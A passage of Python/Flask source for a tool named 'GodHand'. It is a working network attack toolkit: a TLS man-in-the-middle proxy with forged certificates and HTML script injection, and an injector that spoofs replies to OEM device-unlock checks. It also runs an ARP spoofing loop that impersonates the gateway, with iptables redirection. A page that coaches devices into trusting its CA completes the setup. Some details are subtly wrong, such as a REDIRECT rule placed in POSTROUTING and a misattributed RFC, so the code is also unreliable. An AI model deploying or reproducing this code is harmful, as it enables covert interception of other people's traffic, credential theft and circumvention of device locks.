    Phase 2 (injection): Modify responses before forwarding.
    """

    def __init__(self, listen_port=8888, ca=None, cert_cache=None, max_log_size=10000):
        self.listen_port = listen_port
        self.ca = ca
        self.cert_cache = cert_cache
        self.running = False
        self.proxy_thread = None
        self.traffic_log = []
        self.max_log_size = max_log_size
        self.executor = ThreadPoolExecutor(max_workers=50)

    @staticmethod
    def extract_sni(data: bytes) -> str:
        """Extract SNI (Server Name Indication) from TLS ClientHello.

        TLS ClientHello structure:
        - Byte 0: Content Type (0x16 = Handshake)
        - Bytes 1-2: TLS Version
        - Bytes 3-4: Length
        - Byte 5: Handshake Type (0x01 = ClientHello)
        - Bytes 6-8: Handshake Length
        - Bytes 9-10: ClientHello Version
        - Bytes 11-42: Random
        - Byte 43: Session ID Length
        - Then: Extensions (including SNI)

        Args:
            data: Raw TLS ClientHello packet bytes

        Returns:
            Hostname from SNI extension, or empty string if not found
        """
        try:
            if len(data) < 44 or data[0] != 0x16:  # Not a handshake record
                return ""

            # Skip to extension list
            # Position 43 = session ID length
            session_id_len = data[43]
            ext_start = 44 + session_id_len + 2  # +2 for cipher suite length

            if ext_start >= len(data):
                return ""

            # Parse extensions
            while ext_start < len(data):
                if ext_start + 4 > len(data):
                    break

                ext_type = int.from_bytes(data[ext_start:ext_start+2], 'big')
                ext_len = int.from_bytes(data[ext_start+2:ext_start+4], 'big')
                ext_start += 4

                # Extension type 0 = SNI
                if ext_type == 0:
                    if ext_start + 2 > len(data):
                        break
                    sni_list_len = int.from_bytes(data[ext_start:ext_start+2], 'big')
                    ext_start += 2

                    if ext_start + 3 > len(data):
                        break
                    name_type = data[ext_start]  # 0 = host_name
                    name_len = int.from_bytes(data[ext_start+1:ext_start+3], 'big')
                    ext_start += 3

                    if ext_start + name_len > len(data):
                        break

                    hostname = data[ext_start:ext_start+name_len].decode('ascii', errors='ignore')
                    return hostname

                ext_start += ext_len

            return ""
        except Exception as e:
            add_log('warn', f'Failed to extract SNI: {e}')
            return ""

    def detect_cert_pinning_app(self, client_addr: str, hostname: str) -> bool:
        """Detect if connection is from a pinning-enabled app.

        Returns True if this is likely a pinned connection that will reject our fake cert.
        Uses heuristics: known pinning apps, enterprise SSL pinning patterns, and user-defined list.
        """
        # Check user-defined pinning bypass list first
        if hostname in PINNED_HOSTS and PINNED_HOSTS[hostname]['enabled']:
            return True

        # Known apps with strong cert pinning
        pinning_patterns = {
            'com.google': ['drive.google.com', 'accounts.google.com', 'play.google.com'],
            'com.facebook': ['facebook.com', 'instagram.com', 'messenger.com'],
            'com.twitter': ['twitter.com', 'api.twitter.com'],
            'com.stripe': ['stripe.com', 'api.stripe.com'],
            'banking': ['bank', 'secure', 'credential'],
            'health': ['healthkit', 'medical', 'hsa'],
        }

        # Check hostname against known pinning domains
        for app_pattern, domains in pinning_patterns.items():
            for domain in domains:
                if domain in hostname:
                    return True

        # Check for enterprise-grade pinning indicators in hostname
        enterprise_indicators = ['api.', 'secure.', 'auth.', 'oauth.']
        if any(ind in hostname for ind in enterprise_indicators):
            # Likely enterprise service with pinning
            if 'internal' in hostname or 'private' in hostname or 'corp' in hostname:
                return True

        return False

    def transparent_passthrough(self, client_socket: socket.socket, hostname: str, client_addr: tuple) -> bool:
        """Attempt transparent passthrough for pinned certificates.

        Relay traffic between client and upstream without TLS interception.
        This preserves the original certificate chain and bypasses pinning.

        Returns True if passthrough succeeded, False if interception should be attempted instead.
        """
        upstream_socket = None
        try:
            # Connect to upstream server
            upstream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            upstream_socket.settimeout(10)
            upstream_socket.connect((hostname, 443))

            add_log('info', f'Cert pinning detected: transparent passthrough for {client_addr[0]} → {hostname}')

            # Forward all traffic between client and upstream (encrypted, unchanged)
            client_socket.settimeout(0.5)
            upstream_socket.settimeout(0.5)

            sockets = [client_socket, upstream_socket]
            while True:
                readable, _, _ = select.select(sockets, [], [], 1)
                for sock in readable:
                    try:
                        data = sock.recv(8192)
                        if not data:
                            return True

                        # Forward to other socket
                        other_sock = upstream_socket if sock is client_socket else client_socket
                        other_sock.sendall(data)
                    except (socket.timeout, socket.error):
                        pass

        except socket.error as e:
            add_log('warn', f'Passthrough failed for {hostname}: {e}')
            return False
        finally:
            if upstream_socket:
                try:
                    upstream_socket.close()
                except:
                    pass

        return True

    def handle_client_connection(self, client_socket: socket.socket, client_addr: tuple):
        """Handle incoming client TLS connection.

        Process:
        1. Receive TLS ClientHello from client
        2. Extract SNI hostname
        3. Get/generate certificate for hostname
        4. Wrap client socket with TLS using generated cert
        5. Connect to upstream server (hostname:443)
        6. Establish TLS to upstream
        7. Forward traffic between client and upstream
        8. Log HTTP requests/responses

        Args:
            client_socket: Connected socket from device
            client_addr: (ip, port) of connecting device
        """
        client_socket.settimeout(10)
        upstream_socket = None

        try:
            # Receive initial data from client (contains ClientHello)
            client_hello_data = b''
            while len(client_hello_data) < 2048:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    client_hello_data += chunk
                except socket.timeout:
                    break
                if len(client_hello_data) > 100:  # Enough data for SNI extraction
                    break

            if not client_hello_data:
                return

            # Extract hostname from SNI
            hostname = self.extract_sni(client_hello_data)
            if not hostname:
                add_log('warn', f'Could not extract SNI from {client_addr[0]}')
                hostname = 'unknown.local'

            # Check for cert pinning before attempting interception
            if self.detect_cert_pinning_app(client_addr[0], hostname):
                add_log('info', f'Cert pinning detected for {hostname} - attempting transparent passthrough')
                if self.transparent_passthrough(client_socket, hostname, client_addr):
                    return  # Passthrough succeeded
                add_log('warn', f'Passthrough failed for {hostname} - falling back to interception')

            add_log('info', f'MITM intercepting {client_addr[0]} → {hostname}:443')

            # Get certificate for this hostname
            if not self.cert_cache:
                add_log('error', 'Certificate cache not initialized')
                return

            cert_path, cert_pem = self.cert_cache.get_or_create_cert(hostname)

            # Wrap client socket with TLS (using generated cert)
            import ssl
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(cert_path)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            try:
                client_tls = context.wrap_socket(client_socket, server_side=True)
            except ssl.SSLError as e:
                add_log('error', f'TLS handshake failed for {client_addr[0]} → {hostname}: {type(e).__name__}: {e}')
                return

            # Connect to upstream server
            try:
                upstream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                upstream_socket.settimeout(10)
                upstream_socket.connect((hostname, 443))
            except socket.error as e:
                add_log('error', f'Failed to connect to {hostname}:443 - {e}')
                return

            # Wrap upstream connection with TLS
            upstream_context = ssl.create_default_context()
            upstream_context.check_hostname = True
            upstream_context.verify_mode = ssl.CERT_REQUIRED

            try:
                upstream_tls = upstream_context.wrap_socket(upstream_socket, server_hostname=hostname)
            except ssl.SSLError as e:
                add_log('error', f'Upstream TLS failed for {hostname}:443: {type(e).__name__}: {e}')
                return

            # Forward traffic between client and upstream
            self._forward_traffic(client_tls, upstream_tls, hostname, client_addr[0])

        except Exception as e:
            add_log('error', f'Error handling connection from {client_addr[0]}: {e}')
        finally:
            try:
                client_socket.close()
            except:
                pass
            if upstream_socket:
                try:
                    upstream_socket.close()
                except:
                    pass

    def _forward_traffic(self, client_tls, upstream_tls, hostname: str, client_ip: str):
        """Forward traffic between client and upstream server.

        Phase 1 (current): Decrypt, log, forward unchanged.
        Phase 2 (future): Decrypt, modify, re-encrypt.
        Phase 5E: Intercept OEM unlock queries and inject spoofed responses.

        Args:
            client_tls: TLS socket to client device
            upstream_tls: TLS socket to upstream server
            hostname: Target hostname being proxied
            client_ip: IP of connecting device
        """
        try:
            # Use select for bidirectional forwarding
            client_tls.settimeout(0.1)
            upstream_tls.settimeout(0.1)
            buffer_size = 4096
            request_buffer = b''  # Buffer for incomplete HTTP requests

            while True:
                try:
                    # Client → Upstream
                    data = client_tls.recv(buffer_size)
                    if data:
                        request_buffer += data

                        # Phase 1: Log HTTP requests (first line contains method/path)
                        # Check for valid HTTP methods (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS, CONNECT, TRACE)
                        if b' HTTP/' in request_buffer[:100]:  # HTTP method line usually within first 100 bytes
                            # Try to parse HTTP request
                            request_parts = self._parse_http_request(request_buffer)
                            if request_parts:
                                method, path, headers, body = request_parts

                                # Phase 5E: Detect OEM unlock queries
                                if UNLOCK_QUERY_DETECTOR:
                                    device_type, confidence = UNLOCK_QUERY_DETECTOR.detect_query(hostname, path, method, body)

                                    if device_type and confidence > 0.7:
                                        add_log('info', f'OEM unlock query detected: {device_type} from {client_ip} → {hostname}{path}')

                                        # Extract device identifiers
                                        device_info = UNLOCK_QUERY_DETECTOR.extract_device_id(hostname, path, body)
                                        device_id = device_info.get('serial') or device_info.get('imei') or 'unknown'

                                        # Generate spoofed unlock response
                                        if UNLOCK_RESPONSE_GENERATOR:
                                            status, resp_headers, resp_body = UNLOCK_RESPONSE_GENERATOR.generate_response(
                                                device_type, body, device_id
                                            )

                                            # Build HTTP response
                                            spoofed_response = create_custom_http_reply(status, resp_headers, resp_body)
                                            client_tls.sendall(spoofed_response)

                                            add_log('success', f'OEM unlock response injected for {device_type} device (latency: instant)')
                                            self._log_http_request(request_buffer, hostname, client_ip)
                                            self._log_http_response(spoofed_response, hostname, client_ip)

                                            # Clear buffer and continue listening
                                            request_buffer = b''
                                            continue

                                # Not an unlock query - forward to upstream normally
                                self._log_http_request(request_buffer, hostname, client_ip)
                                upstream_tls.sendall(request_buffer)
                                request_buffer = b''
                except socket.timeout:
                    pass

                try:
                    # Upstream → Client
                    data = upstream_tls.recv(buffer_size)
                    if data:
                        # Parse response for inspection/modification
                        parsed = HTTPManipulator.parse_http_response(data)

                        # Apply injection rules to modify response content
                        if 'text/html' in parsed['headers'].get('content-type', '').lower():
                            # Example: Inject logging script before </body>
                            data = ResponseModifier.apply_rules(hostname, data)
                            # Re-parse modified response for logging
                            parsed = HTTPManipulator.parse_http_response(data)

                        client_tls.sendall(data)
                        # Log HTTP responses (first line contains status code)
                        if data.startswith(b'HTTP/'):
                            self._log_http_response(data, hostname, client_ip)
                except socket.timeout:
                    pass
        except Exception as e:
            add_log('warn', f'Traffic forwarding error for {hostname}: {e}')

    def _log_http_request(self, data: bytes, hostname: str, client_ip: str):
        """Log HTTP request in JSON format for inspection.

        Phase 1: Log only (no modification).
        """
        try:
            lines = data.split(b'\r\n')
            if lines:
                request_line = lines[0].decode('ascii', errors='ignore')
                entry = {
                    'timestamp': time.time(),
                    'type': 'request',
                    'client_ip': client_ip,
                    'hostname': hostname,
                    'request_line': request_line,
                    'bytes': len(data)
                }
                self._add_traffic_entry(entry)
                add_log('info', f'[HTTPS] {client_ip} → {hostname}: {request_line}')
        except Exception as e:
            add_log('warn', f'Failed to log HTTP request: {e}')

    def _log_http_response(self, data: bytes, hostname: str, client_ip: str):
        """Log HTTP response in JSON format for inspection.

        Phase 1: Log only (no modification).
        """
        try:
            lines = data.split(b'\r\n')
            if lines:
                status_line = lines[0].decode('ascii', errors='ignore')
                entry = {
                    'timestamp': time.time(),
                    'type': 'response',
                    'client_ip': client_ip,
                    'hostname': hostname,
                    'status_line': status_line,
                    'bytes': len(data)
                }
                self._add_traffic_entry(entry)
                add_log('info', f'[HTTPS] {hostname} → {client_ip}: {status_line}')
        except Exception as e:
            add_log('warn', f'Failed to log HTTP response: {e}')

    def _parse_http_request(self, data: bytes):
        """Parse HTTP request from buffer.

        Returns: (method, path, headers_dict, body_bytes) or None if incomplete.
        """
        try:
            # Look for double CRLF that separates headers from body
            if b'\r\n\r\n' not in data:
                return None  # Incomplete request

            header_section, body = data.split(b'\r\n\r\n', 1)
            lines = header_section.split(b'\r\n')

            if not lines:
                return None

            # Parse request line: "GET /path HTTP/1.1"
            request_line = lines[0].decode('ascii', errors='ignore')
            parts = request_line.split()

            if len(parts) < 2:
                return None

            method = parts[0]  # GET, POST, etc.
            path = parts[1]    # /path?query

            # Parse headers
            headers = {}
            for line in lines[1:]:
                if b':' in line:
                    key, value = line.split(b':', 1)
                    headers[key.decode('ascii', errors='ignore').strip().lower()] = value.decode('ascii', errors='ignore').strip()

            # Handle Content-Length to get complete body
            content_length = int(headers.get('content-length', 0))
            if len(body) < content_length:
                return None  # Incomplete body

            return (method, path, headers, body[:content_length])
        except Exception as e:
            add_log('dev', f'HTTP request parse error: {e}')
            return None

    def start(self):
        """Start MITM proxy server listening on port 8888."""
        if self.running:
            add_log('warn', 'MITM proxy already running')
            return

        self.running = True
        self.proxy_thread = threading.Thread(target=self._run_server, daemon=True)
        self.proxy_thread.start()
        add_log('success', f'HTTPS MITM proxy started on port {self.listen_port}')

    def _run_server(self):
        """Server loop - accept connections and handle them."""
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', self.listen_port))
            server_socket.listen(10)
            add_log('info', f'MITM proxy listening on port {self.listen_port}')

            while self.running:
                try:
                    server_socket.settimeout(1)
                    client_socket, client_addr = server_socket.accept()
                    # Handle each connection via bounded thread pool (max 50 workers)
                    self.executor.submit(self.handle_client_connection, client_socket, client_addr)
                except socket.timeout:
                    continue
                except Exception as e:
                    add_log('error', f'Accept error: {e}')
        except Exception as e:
            add_log('error', f'MITM proxy failed to start: {e}')
            self.running = False

    def stop(self):
        """Stop MITM proxy server and shut down thread pool."""
        self.running = False
        self.executor.shutdown(wait=False)
        add_log('info', 'MITM proxy stopped')

    def _add_traffic_entry(self, entry: dict):
        """Add entry to traffic log with automatic size management and database persistence."""
        self.traffic_log.append(entry)
        if len(self.traffic_log) > self.max_log_size:
            self.traffic_log = self.traffic_log[-self.max_log_size:]

        # Store in database for persistence (Phase 5D)
        try:
            if TRAFFIC_DATABASE:
                TRAFFIC_DATABASE.add_entry(entry)
        except Exception as e:
            pass  # Silently fail; don't disrupt traffic forwarding

    def get_traffic_log(self, limit=100):
        """Return recent traffic log entries."""
        return self.traffic_log[-limit:]


class ARPSpoofingFallback:
    """Fallback MITM via ARP spoofing when transparent proxy unavailable.

    When transparent interception fails, fall back to ARP spoofing:
    1. Declare ourselves as the gateway using ARP replies
    2. Configure Linux routing to forward intercepted traffic
    3. Use iptables to redirect HTTPS traffic to local proxy port
    4. Gracefully handle cleanup on disable
    """

    def __init__(self):
        self.active = False
        self.spoofed_gateway_ip = None
        self.real_gateway_mac = None
        self.our_mac = None
        self.iface = None
        self.targets = []
        self.spoof_thread = None

    def detect_transparent_proxy_available(self, iface: str) -> bool:
        """Check if transparent proxy mode is available on this interface.

        Returns True if iptables REDIRECT target is available.
        """
        try:
            # Test if we can query iptables (requires root)
            result = subprocess.run(
                ['iptables', '-L', '-n', '-t', 'nat'],
                capture_output=True, timeout=2, text=True
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def enable_arp_spoofing(self, iface: str, gateway_ip: str, targets: list, our_ip: str):
        """Enable ARP spoofing fallback on specified interface.

        Args:
            iface: Network interface (e.g., 'wlan0')
            gateway_ip: Real gateway IP to spoof
            targets: List of target IP addresses to intercept
            our_ip: Our IP address on this interface
        """
        if self.active:
            add_log('warn', 'ARP spoofing already active')
            return False

        try:
            # Get our MAC address
            result = subprocess.run(
                ['ip', 'link', 'show', iface],
                capture_output=True, text=True, timeout=5
            )
            match = re.search(r'link/ether ([0-9a-f:]+)', result.stdout)
            if not match:
                add_log('error', f'Could not determine MAC address for {iface}')
                return False
            self.our_mac = match.group(1)

            # Get real gateway MAC via ARP
            result = subprocess.run(
                ['arp', '-n', gateway_ip],
                capture_output=True, text=True, timeout=5
            )
            match = re.search(r'([0-9a-f:]+) at', result.stdout)
            if not match:
                add_log('warn', f'Could not resolve gateway MAC for {gateway_ip}')
                self.real_gateway_mac = None
            else:
                self.real_gateway_mac = match.group(1)

            # Enable IP forwarding
            self._enable_ip_forwarding()

            # Configure iptables for traffic redirection
            self._configure_iptables(iface, targets)

            self.active = True
            self.iface = iface
            self.spoofed_gateway_ip = gateway_ip
            self.targets = targets

            # Start ARP spoofing thread
            self.spoof_thread = threading.Thread(
                target=self._spoof_arp_loop,
                args=(iface, gateway_ip, targets, our_ip),
                daemon=True
            )
            self.spoof_thread.start()

            add_log('success', f'ARP spoofing fallback enabled on {iface}')
            return True

        except Exception as e:
            add_log('error', f'Failed to enable ARP spoofing: {e}')
            return False

    def _enable_ip_forwarding(self):
        """Enable IP forwarding in kernel."""
        try:
            subprocess.run(
                ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                capture_output=True, timeout=5, check=True
            )
            add_log('info', 'IP forwarding enabled')
        except (FileNotFoundError, subprocess.CalledProcessError):
            add_log('warn', 'Failed to enable IP forwarding (sysctl unavailable)')

    def _configure_iptables(self, iface: str, targets: list):
        """Configure iptables to redirect HTTPS traffic to proxy."""
        try:
            # Create custom chain for traffic interception
            subprocess.run(
                ['iptables', '-t', 'nat', '-N', 'GODHAND_HTTPS'],
                capture_output=True, timeout=5
            )  # Ignore error if chain exists

            # Redirect HTTPS traffic from targets to proxy port
            for target_ip in targets:
                subprocess.run(
                    ['iptables', '-t', 'nat', '-A', 'GODHAND_HTTPS',
                     '-p', 'tcp', '-d', target_ip, '--dport', '443',
                     '-j', 'REDIRECT', '--to-port', '8888'],
                    capture_output=True, timeout=5, check=True
                )

            # Forward chain to apply redirection
            subprocess.run(
                ['iptables', '-t', 'nat', '-A', 'POSTROUTING',
                 '-i', iface, '-j', 'GODHAND_HTTPS'],
                capture_output=True, timeout=5, check=True
            )

            add_log('success', f'iptables redirection configured for {len(targets)} targets')

        except (FileNotFoundError, subprocess.CalledProcessError) as e:
            add_log('warn', f'iptables configuration failed: {e}')

    def _spoof_arp_loop(self, iface: str, gateway_ip: str, targets: list, our_ip: str):
        """Continuously send ARP replies claiming to be the gateway.

        This makes target devices think we are the gateway, routing traffic through us.
        """
        try:
            # Build ARP reply packet: we claim to own the gateway IP
            src_mac = self.our_mac.replace(':', '')
            src_mac_bytes = bytes.fromhex(src_mac)

            while self.active:
                for target_ip in targets:
                    try:
                        # ARP reply: we are gateway_ip
                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip)
                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
                        sock.bind((iface, 0))
                        sock.send(packet)
                        sock.close()
                    except Exception as e:
                        add_log('warn', f'ARP spoof to {target_ip} failed: {e}')

                time.sleep(2)  # Re-spoof every 2 seconds to maintain cache

        except Exception as e:
            add_log('error', f'ARP spoofing loop failed: {e}')

    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str) -> bytes:
        """Build raw ARP reply packet."""
        # Ethernet header
        dst_mac = bytes.fromhex('ffffffffffff')  # Broadcast
        frame_type = struct.pack('!H', 0x0806)  # ARP

        # ARP packet
        hw_type = struct.pack('!H', 1)  # Ethernet
        proto_type = struct.pack('!H', 0x0800)  # IPv4
        hw_len = struct.pack('!B', 6)  # MAC length
        proto_len = struct.pack('!B', 4)  # IP length
        operation = struct.pack('!H', 2)  # Reply

        # Convert IPs to bytes
        gw_bytes = socket.inet_aton(gateway_ip)
        target_bytes = socket.inet_aton(target_ip)

        arp_packet = (hw_type + proto_type + hw_len + proto_len + operation +
                      src_mac + gw_bytes + dst_mac + target_bytes)

        return dst_mac + src_mac + frame_type + arp_packet

    def disable_arp_spoofing(self):
        """Disable ARP spoofing and clean up iptables rules."""
        if not self.active:
            return

        self.active = False

        try:
            # Flush GODHAND_HTTPS chain
            subprocess.run(
                ['iptables', '-t', 'nat', '-F', 'GODHAND_HTTPS'],
                capture_output=True, timeout=5
            )

            # Delete GODHAND_HTTPS chain
            subprocess.run(
                ['iptables', '-t', 'nat', '-X', 'GODHAND_HTTPS'],
                capture_output=True, timeout=5
            )

            # Remove POSTROUTING rule
            subprocess.run(
                ['iptables', '-t', 'nat', '-D', 'POSTROUTING',
                 '-i', self.iface, '-j', 'GODHAND_HTTPS'],
                capture_output=True, timeout=5
            )

            # Disable IP forwarding (if no other services need it)
            subprocess.run(
                ['sysctl', '-w', 'net.ipv4.ip_forward=0'],
                capture_output=True, timeout=5
            )

            add_log('success', 'ARP spoofing fallback disabled and cleaned up')

        except Exception as e:
            add_log('warn', f'Cleanup failed: {e}')

    def get_status(self) -> dict:
        """Get current ARP spoofing fallback status."""
        return {
            'active': self.active,
            'interface': self.iface,
            'gateway_ip': self.spoofed_gateway_ip,
            'gateway_mac': self.real_gateway_mac,
            'our_mac': self.our_mac,
            'targets_count': len(self.targets) if self.targets else 0
        }


ARP_FALLBACK = None
try:
    ARP_FALLBACK = ARPSpoofingFallback()
    add_log('dev', 'ARP spoofing fallback initialized')
except Exception as e:
    add_log('warn', f'Failed to initialize ARP spoofing fallback: {e} (ARP spoofing fallback disabled)')

# Initialize MITM proxy on startup
try:
    HTTPS_PROXY = HTTPSInterceptProxy(listen_port=8888, ca=CERT_AUTHORITY, cert_cache=CERT_CACHE)
    add_log('success', 'HTTPS MITM proxy infrastructure initialized')
except Exception as e:
    add_log('error', f'Failed to initialize MITM proxy: {e}')
    HTTPS_PROXY = None

# ---------- PAC File Server ----------
def generate_pac_file(proxy_host: str = '127.0.0.1', proxy_port: int = 8888) -> str:
    """Generate RFC 2496-compliant PAC (Proxy Auto-Config) file.

    The PAC file is JavaScript that browsers execute to determine proxy settings.
    This implementation routes all HTTP/HTTPS traffic through the MITM proxy.

    Args:
        proxy_host: IP or hostname of proxy server
        proxy_port: Port proxy listens on

    Returns:
        Complete PAC file as JavaScript string
    """
    pac_js = f"""
function FindProxyForURL(url, host) {{
    // Route all traffic through MITM proxy
    var proxy = "PROXY {proxy_host}:{proxy_port}";

    // Direct connection for localhost/internal IPs (avoid proxy loops)
    var localhost = "DIRECT";

    if (shExpMatch(host, "localhost") ||
        shExpMatch(host, "127.0.0.1") ||
        shExpMatch(host, "*.local") ||
        shExpMatch(host, "*.internal") ||
        isInNet(dnsResolve(host), "192.168.0.0", "255.255.0.0") ||
        isInNet(dnsResolve(host), "10.0.0.0", "255.0.0.0") ||
        isInNet(dnsResolve(host), "172.16.0.0", "255.240.0.0")) {{
        return localhost;
    }}

    return proxy;
}}
"""
    return pac_js.strip()


# Initialize OEM unlock detection infrastructure (Phase 5E)
UNLOCK_QUERY_DETECTOR = None
UNLOCK_RESPONSE_GENERATOR = None
try:
    UNLOCK_QUERY_DETECTOR = UnlockQueryDetector()
    add_log('dev', 'UnlockQueryDetector initialized successfully')
except Exception as e:
    add_log('error', f'Failed to initialize UnlockQueryDetector: {e} (OEM unlock detection disabled)')

try:
    UNLOCK_RESPONSE_GENERATOR = ResponseTemplateGenerator()
    add_log('dev', 'ResponseTemplateGenerator initialized successfully')
except Exception as e:
    add_log('error', f'Failed to initialize ResponseTemplateGenerator: {e} (OEM unlock injection disabled)')

if UNLOCK_QUERY_DETECTOR and UNLOCK_RESPONSE_GENERATOR:
    add_log('success', 'OEM unlock Phase 5E infrastructure fully operational')
elif UNLOCK_QUERY_DETECTOR or UNLOCK_RESPONSE_GENERATOR:
    add_log('warn', 'OEM unlock Phase 5E partially operational (detector or generator unavailable)')
else:
    add_log('warn', 'OEM unlock Phase 5E disabled (initialization failed)')

app = Flask(__name__)

# Initialize traffic database
TRAFFIC_DATABASE = None
try:
    db = TrafficDatabase()
    if db.initialized:
        TRAFFIC_DATABASE = db
        add_log('success', 'Traffic database initialized')
    else:
        add_log('error', 'Traffic database initialization failed (db.initialized=False)')
except Exception as e:
    add_log('error', f'Failed to initialize traffic database: {e}')

@app.after_request
def add_no_cache_headers(response):
    # This app's login gate lives entirely in the HTML/JS served by GET / --
    # if a mobile browser (or a carrier/ISP transparent caching proxy, which is
    # common on cellular data) ever caches that page, a phone can keep loading
    # a stale pre-login copy indefinitely and never see the gate at all, no
    # matter how correct the server-side logic is. Every response, not just /,
    # is marked uncacheable so there is no path to a stale copy of any of it.
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

# ---------- login (mandatory: a password always exists, see AUTO_GENERATED_PASSWORD above) ----------
@app.route('/api/login_required', methods=['GET'])
def api_login_required():
    # True whenever require_auth would actually gate a request -- keeps this in
    # lockstep with require_auth's own condition so the login screen never skips
    # itself for a server that's still going to 401 every API call.
    return jsonify({'login_required': bool(LOGIN_PASSWORD or SECRET)})

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json or {}
    username = data.get('username', '')
    password = data.get('password', '')
    if LOGIN_PASSWORD and username == LOGIN_USERNAME and secrets.compare_digest(password, LOGIN_PASSWORD):
        token = secrets.token_hex(32)
        with SESSIONS_LOCK:
            VALID_SESSIONS.add(token)
        add_log('info', f'Login successful for user {username}')
        return jsonify({'success': True, 'token': token})
    # Legacy mode: GODHAND_SECRET alone (no username/password configured) --
    # the access token doubles as the password so there's still one login
    # screen instead of a dead end for anyone still using the old flow.
    if SECRET and secrets.compare_digest(password, SECRET):
        token = secrets.token_hex(32)
        with SESSIONS_LOCK:
            VALID_SESSIONS.add(token)
        add_log('info', 'Login successful via access token')
        return jsonify({'success': True, 'token': token})
    if not LOGIN_PASSWORD and not SECRET:
        return jsonify({'success': False, 'error': 'Login is not configured on this server'})
    add_log('warn', f'Failed login attempt for user {username!r}')
    return jsonify({'success': False, 'error': 'Invalid username or password'})

@app.route('/api/logout', methods=['POST'])
@require_auth
def api_logout():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    with SESSIONS_LOCK:
        VALID_SESSIONS.discard(token)
    return jsonify({'success': True})

# ---------- PAC file server (HTTPS interception configuration) ----------
@app.route('/pac', methods=['GET'])
def serve_pac_file():
    """Serve PAC (Proxy Auto-Config) file for browser/device proxy settings.

    Browsers will fetch this file and use it to determine which traffic
    routes through the MITM proxy (port 8888).

    Access: http://pac.installCA.lan/pac or http://<device-ip>:5000/pac
    """
    device_ip = request.host.split(':')[0]
    pac_content = generate_pac_file(proxy_host=device_ip, proxy_port=8888)
    return Response(pac_content, mimetype='application/x-ns-proxy-autoconfig')

@app.route('/ca-cert', methods=['GET'])
def serve_ca_certificate():
    """Serve CA certificate for manual installation on target devices.

    Devices need to trust the CA certificate before HTTPS interception works.
    They can download this certificate and install it in their system trust store.

    Access: http://pac.installCA.lan/ca-cert or http://<device-ip>:5000/ca-cert
    """
    if not CERT_AUTHORITY:
        abort(503, description='Certificate infrastructure not initialized')

    cert_path = CERT_AUTHORITY.get_ca_cert_path()
    try:
        with open(cert_path, 'r') as f:
            cert_pem = f.read()
        return Response(cert_pem, mimetype='application/x-pem-file',
                       headers={'Content-Disposition': 'attachment; filename="godhand-ca.pem"'})
    except Exception as e:
        add_log('error', f'Failed to serve CA certificate: {e}')
        abort(500, description='Failed to read CA certificate')

@app.route('/pac.installCA.lan', methods=['GET'])
@app.route('/pac.installCA.lan/pac', methods=['GET'])
def pac_install_ca_index():
    """Landing page for .lan domain (pac.installCA.lan).

    Serves the PAC file and explains how to install the CA certificate.
    The .lan hostname signals to users that they're installing a custom CA.

    Access: http://pac.installCA.lan or http://pac.installCA.lan/pac
    """
    if not CERT_AUTHORITY:
        return 'Certificate infrastructure not initialized', 503

    device_ip = request.host.split(':')[0]
    pac_url = f'http://{device_ip}:5000/pac'
    ca_cert_url = f'http://{device_ip}:5000/ca-cert'

    html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GodHand - Install CA Certificate</title>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; color: #333; }}
        .warning {{ background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 16px; margin: 20px 0; }}
        .instructions {{ background: #e7f3ff; border: 1px solid #0066cc; border-radius: 8px; padding: 16px; margin: 20px 0; }}
        .code {{ background: #f5f5f5; border: 1px solid #ddd; border-radius: 4px; padding: 12px; font-family: monospace; word-break: break-all; }}
        a {{ color: #0066cc; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
        h1 {{ color: #0066cc; }}
    </style>
</head>
<body>
    <h1>GodHand HTTPS Interception</h1>

    <div class="warning">
        <strong>⚠️ You are about to install a custom Certificate Authority (CA) certificate.</strong><br>
        This allows the GodHand proxy to intercept and decrypt your HTTPS traffic for inspection.
    </div>

    <div class="instructions">
        <h2>Step 1: Download CA Certificate</h2>
        <p>Download the CA certificate file:</p>
        <p><a href="{ca_cert_url}" download="godhand-ca.pem">📥 Download CA Certificate (godhand-ca.pem)</a></p>
    </div>

    <div class="instructions">
        <h2>Step 2: Configure Your Device</h2>
        <p><strong>iOS / macOS:</strong></p>
        <ol>
            <li>Save the downloaded certificate</li>
            <li>Settings → General → VPN & Device Management</li>
            <li>Trust the "GodHand CA" certificate</li>
            <li>Settings → WiFi → Configure Proxy</li>
            <li>Select "Automatic" and enter: <code>{pac_url}</code></li>
        </ol>

        <p><strong>Android:</strong></p>
        <ol>
            <li>Settings → Security → Encryption & Credentials → Install Certificate</li>
            <li>Select the downloaded certificate</li>
            <li>Settings → WiFi → Long-press your network → Modify → Proxy</li>
            <li>Select "PAC" and enter: <code>{pac_url}</code></li>
        </ol>

        <p><strong>Windows:</strong></p>
        <ol>
            <li>Double-click the certificate to install it</li>
            <li>Choose "Install Certificate" → Local Machine</li>
            <li>Settings → Network → Proxy</li>
            <li>Enter PAC URL: <code>{pac_url}</code></li>
        </ol>
    </div>

    <div class="instructions">
        <h2>Step 3: Verify</h2>
        <p>Navigate to any HTTPS website. Traffic should now appear in GodHand's traffic monitor.</p>
        <p>If you see certificate warnings, the CA certificate wasn't properly installed.</p>
